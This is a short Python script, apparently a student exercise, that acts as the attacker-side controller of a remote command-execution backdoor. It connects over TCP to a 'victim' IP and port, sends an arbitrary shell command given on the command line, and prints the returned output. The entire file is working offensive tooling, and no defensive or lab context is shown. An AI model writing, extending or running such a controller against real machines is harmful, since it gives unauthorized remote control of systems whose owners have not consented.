
import argparse
import socket
import sys

def send_request(connection_socket, command):
    connection_socket.send(str.encode(command))

def recieve_request(connected_socket):
    print("recievieng request...")
    try:
        data = connected_socket.recv(1024)
    except socket.timeout:
        close_connection(connected_socket) 
        sys.exit("No data received in reasonable time, connection closed")
    except ConnectionResetError:
        close_connection(connected_socket)
        sys.exit("Error: Victim server disconnected")
    except KeyboardInterrupt:
        close_connection(connected_socket) 
        sys.exit("You have disconnected from the Victim server")
    print("Recieved output: \n" + data.decode("utf-8"))


def close_connection(atacker_socket):
    atacker_socket.close()

def connect_to_server(port_num, ip_addr):
    attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attacker_socket.settimeout(10)
    try:
        attacker_socket.connect((ip_addr, port_num))
    except ConnectionRefusedError:
        sys.exit("Error: Connection refused the either the victim server is not listening or the port number is incorrect!")
    except OSError as error:
        if error.errno == 113:
            sys.exit("Error: The IP address can't be found make sure it is an IP address on the server device")
        if error.errno == -3:
            sys.exit("Error: Invalid IP address")
    return attacker_socket

def validate_arguments(parsed_args):
    port_num = parsed_args.victim_port
    ip_addr = parsed_args.victim_ip
    if(port_num < 0 or port_num > 65535):
        sys.exit("Error: Port number out of range must be between 0 - 65535")

    number_chunks_in_ip = ip_addr.split(".")
    if(len(number_chunks_in_ip) != 4 ):
        sys.exit("Error: Invalid IP address not enough dots should be 4!")
    
    for number in number_chunks_in_ip:

        if number.isalpha():
            sys.exit("Error: Invalid IP address contains a letter!")
        try:
            int(number)
        except:
            sys.exit("Error: Invalid IP address contains a character that isn't a number!")
        if int(number) > 255 or int(number) < 0:
            sys.exit("Error: Invalid IP address contains a number outside of te range of 0 to 255")
    

def parse_arguments():
    parser = argparse.ArgumentParser(prog=sys.argv[0])
    parser.add_argument("--cmd",type=str, required=True, help="command to execute on victim")
    parser.add_argument("--victim-ip",type=str, required=True, help="ip address of vicitm machine")
    parser.add_argument("--victim-port",type=int, required=True, help="port number that victim listening on")
    args = parser.parse_args()
    return args

def main():
    print("connecting attacker to victim")
    parsed_args = parse_arguments()
    validate_arguments(parsed_args)
    port_num = parsed_args.victim_port
    ip_addr = parsed_args.victim_ip
    command = parsed_args.cmd
    connection_socket = connect_to_server(port_num, ip_addr)
    send_request(connection_socket, command)
    recieve_request(connection_socket)
    close_connection(connection_socket)
main()